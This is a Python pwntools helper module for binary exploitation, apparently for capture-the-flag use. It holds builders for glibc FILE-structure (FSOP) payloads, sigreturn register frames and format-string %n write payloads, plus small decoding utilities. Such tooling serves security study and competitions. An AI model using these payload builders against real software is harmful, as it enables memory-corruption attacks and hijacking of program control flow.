#!/usr/bin/python3

import sys
import os
from pwn import *

class FilePlusStruct:
	def __init__(self):
		self._flags = 0
		self._IO_read_ptr = 0
		self._IO_read_end = 0
		self._IO_read_base = 0
		self._IO_write_base = 0
		self._IO_write_ptr = 0
		self._IO_write_end = 0
		self._IO_buf_base = 0
		self._IO_buf_end = 0
		self._chain = 0
		self._fileno = 0
		self._lock = 0
		self._vtable = 0
	
	def get_payload(self):
		s = b""
		s += p64(self._flags)
		s += p64(self._IO_read_ptr)
		s += p64(self._IO_read_end)
		s += p64(self._IO_read_base)
		s += p64(self._IO_write_base)
		s += p64(self._IO_write_ptr)
		s += p64(self._IO_write_end)
		s += p64(self._IO_buf_base)
		s += p64(self._IO_buf_end)
		s += p64(0)*4
		s += p64(self._chain)
		s += p64(self._fileno)
		s += p64(0)*2
		s += p64(self._lock)
		s += p64(0xffffffffffffffff)
		s += p64(0)*5
		s += p64(0xffffffff)
		s += p64(0)*2
		s += p64(self._vtable)
		return s
	
	def bypass_fsop(self, rip, rdi, lock, vtable):
		self._IO_write_ptr = (rdi-100)//2
		self._IO_buf_end = (rdi-100)//2
		self._lock = lock
		self._vtable = vtable
		return self.get_payload() + p64(rip)

def bypass_fsop(rip, rdi, lock, vtable):
	fileplus = FilePlusStruct()
	return fileplus.bypass_fsop(rip, rdi, lock, vtable)

class SOP():
	def __init__(self):
		self.r8 = 0
		self.r9 = 0
		self.r10 = 0
		self.r11 = 0
		self.r12 = 0
		self.r13 = 0
		self.r14 = 0
		self.r15 = 0
		self.rdi = 0
		self.rsi = 0
		self.rbp = 0
		self.rbx = 0
		self.rdx = 0
		self.rax = 0
		self.rcx = 0
		self.rsp = 0
		self.rip = 0
		self.eflags = 0
		self.cs_gs_fs = 0x33
	
	def get_payload(self):
		s = b""
		s += p64(0)*5
		s += p64(self.r8)
		s += p64(self.r9)
		s += p64(self.r10) 
		s += p64(self.r11) 
		s += p64(self.r12) 
		s += p64(self.r13) 
		s += p64(self.r14) 
		s += p64(self.r15) 
		s += p64(self.rdi) 
		s += p64(self.rsi) 
		s += p64(self.rbp) 
		s += p64(self.rbx) 
		s += p64(self.rdx) 
		s += p64(self.rax) 
		s += p64(self.rcx) 
		s += p64(self.rsp) 
		s += p64(self.rip) 
		s += p64(self.eflags)
		s += p64(self.cs_gs_fs)
		s += p64(0)*7
		return s

def fsb(width, offset, data, padding, roop):
	payload = ""
	write_num = 0 
	write_all = 0
	s = "$n"
	mask = 0xffffffff
	if width == 1:
		s = "$hhn"
		mask = 0xff
	elif width == 2:
		s = "$hn"
		mask = 0xffff
	elif width == 4:
		s = "$n"
		mask = 0xffffffff
	
	for i in range(0, roop):
		write_num = ((((data >> (i*8*width)) & mask) + (1 << width*8)) - (write_all & mask) - padding)
		if write_num > (1 << width*8):
			write_num -= (1 << width*8) 
		payload += "%"
		payload += str(write_num)
		payload += "x%"
		payload += str(offset+i)
		payload += s
		write_all += write_num 
		
	return payload

def rot(s, num):
	n = ""
	for i in range(0, len(s)):
		c = ord(s[i])
		if c <= ord("z") and c >= ord("a"):
			c = ((c%ord("a") + num) % 26)+ord("a") 
		elif c <= ord("Z") and c >= ord("A"):
			c = ((c%ord("A") + num) % 26)+ord("A")
		n += chr(c)
	return n 

def b2d(s):
	r = 0 
	for i in range(0, len(s)):
		r = r << 1 
		if s[i] == '1':
			r += 1
	return r

def o2d(s):
	r = 0 
	for i in range(0, len(s)):
		r = r * 8 
		r += int(s[i])
	return r

# for house of corrosion
def offset2size(off):
	return ((off)*2-0x10)

